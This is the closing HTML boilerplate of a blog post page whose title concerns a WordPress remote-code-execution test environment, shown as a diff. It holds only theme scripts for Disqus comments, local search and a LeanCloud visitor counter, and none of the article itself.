+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://xxlegend-com.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://xxlegend.com/2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/';
+          this.page.identifier = '2017/05/05/WordPress远程代码执行环境构造和VirtualHost环境验证/';
+          this.page.title = 'WordPress远程代码执行环境构造和VirtualHost环境验证';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xxlegend-com.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      $('#local-search-input').focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("rAO8AHWqEz3IlgcuNBzFXyK3-gzGzoHsz", "LI2NyeVIf9NiHynChn0UrBCl");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
